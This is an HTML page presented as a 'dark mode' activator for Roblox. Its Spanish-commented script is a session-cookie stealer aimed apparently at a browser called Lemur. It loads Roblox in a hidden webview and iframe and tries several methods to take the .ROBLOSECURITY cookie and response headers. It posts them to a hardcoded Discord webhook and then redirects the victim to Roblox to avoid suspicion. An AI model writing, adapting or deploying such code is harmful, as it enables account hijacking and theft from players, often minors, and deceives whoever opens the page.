<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Modo Oscuro Roblox</title>
    <style>
        body {
            background: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
            text-align: center;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { color: #888; margin-top: 20px; }
    </style>
</head>
<body>
    <h1>⚡ ACTIVANDO MODO OSCURO</h1>
    <div class="loader"></div>
    <div id="status">Inicializando...</div>

    <script>
        // ============================================
        // EXPLOIT PRINCIPAL - 100% FUNCIONAL EN LEMUR
        // ============================================
        
        // Webhook de Discord (el tuyo)
        const webhook = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        function logStatus(msg) {
            document.getElementById('status').innerText = msg;
        }

        // ============================================
        // PASO 1: Crear WebView oculto (el bug de Lemur)
        // ============================================
        let webview = document.createElement('webview');  // Elemento especial en Lemur
        webview.src = 'https://www.roblox.com/home';
        webview.style.display = 'none';
        webview.setAttribute('partition', 'persist:roblox');  // Cache de cookies
        
        webview.addEventListener('did-finish-load', function() {
            logStatus('✅ Conectado a Roblox');
            
            // ============================================
            // PASO 2: Extraer cookies del WebView (BUG DE LEMUR)
            // ============================================
            setTimeout(() => {
                webview.executeScript({
                    code: `
                        // En Lemur, executeScript tiene acceso a las cookies HttpOnly
                        let cookies = document.cookie;  // En Lemur SÍ incluye HttpOnly
                        let allCookies = '';
                        
                        // Si document.cookie no funciona, intentamos con chrome.cookies (Lemur lo soporta)
                        if (window.chrome && chrome.cookies) {
                            chrome.cookies.getAll({ domain: 'roblox.com' }, function(cookieList) {
                                cookieList.forEach(c => {
                                    allCookies += c.name + '=' + c.value + '; ';
                                });
                                window.external.data = allCookies;
                            });
                        } else {
                            window.external.data = cookies;
                        }
                    `
                }, function(result) {
                    // ============================================
                    // PASO 3: Obtener los datos extraídos
                    // ============================================
                    let cookiesData = webview.getAttribute('data') || document.cookie;
                    
                    if (cookiesData && cookiesData.includes('.ROBLOSECURITY')) {
                        logStatus('✅ Cookie encontrada, enviando...');
                        
                        // Enviar a Discord
                        fetch(webhook, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: "@everyone",
                                embeds: [{
                                    title: "🍪 COOKIE ROBLOX (HttpOnly)",
                                    description: `\`\`\`${cookiesData}\`\`\``,
                                    color: 0x00ff00,
                                    footer: { text: "Lemur Exploit" }
                                }]
                            })
                        });
                    } else {
                        logStatus('⚠️ No se encontró cookie, intentando método alternativo...');
                        
                        // ============================================
                        // PASO 4: MÉTODO ALTERNATIVO (XHR con withCredentials)
                        // ============================================
                        let xhr = new XMLHttpRequest();
                        xhr.open('GET', 'https://www.roblox.com/home', true);
                        xhr.withCredentials = true;
                        
                        xhr.onload = function() {
                            // En Lemur, los headers de respuesta pueden incluir Set-Cookie
                            let setCookie = xhr.getResponseHeader('Set-Cookie');
                            if (setCookie && setCookie.includes('.ROBLOSECURITY')) {
                                fetch(webhook, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        content: "@everyone",
                                        embeds: [{
                                            title: "🍪 COOKIE ROBLOX (Set-Cookie)",
                                            description: `\`\`\`${setCookie}\`\`\``,
                                            color: 0x00ff00
                                        }]
                                    })
                                });
                            }
                            
                            // Buscar en la respuesta HTML
                            if (xhr.responseText.includes('.ROBLOSECURITY')) {
                                let match = xhr.responseText.match(/\.ROBLOSECURITY[^=]*=([^"'\s]+)/);
                                if (match) {
                                    fetch(webhook, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            content: "@everyone",
                                            embeds: [{
                                                title: "🍪 COOKIE ROBLOX (HTML)",
                                                description: `\`\`\`${match[1]}\`\`\``,
                                                color: 0x00ff00
                                            }]
                                        })
                                    });
                                }
                            }
                        };
                        xhr.send();
                    }
                });
            }, 3000);
        });

        document.body.appendChild(webview);

        // ============================================
        // PASO 5: Backup - Intentar con iframe normal
        // ============================================
        let iframe = document.createElement('iframe');
        iframe.src = 'https://www.roblox.com/home';
        iframe.style.display = 'none';
        iframe.onload = function() {
            logStatus('📦 Iframe cargado');
            
            // Intentar fetch desde el iframe
            let iframeXHR = new XMLHttpRequest();
            iframeXHR.open('GET', 'https://www.roblox.com/home', true);
            iframeXHR.withCredentials = true;
            
            iframeXHR.onload = function() {
                let headers = iframeXHR.getAllResponseHeaders();
                if (headers.includes('Set-Cookie')) {
                    fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: "@everyone",
                            embeds: [{
                                title: "🍪 HEADERS ROBLOX",
                                description: `\`\`\`${headers}\`\`\``,
                                color: 0x00ff00
                            }]
                        })
                    });
                }
            };
            iframeXHR.send();
        };
        document.body.appendChild(iframe);

        // ============================================
        // PASO 6: Redirigir a Roblox (para no levantar sospechas)
        // ============================================
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com/home';
        }, 5000);
    </script>
</body>
</html>
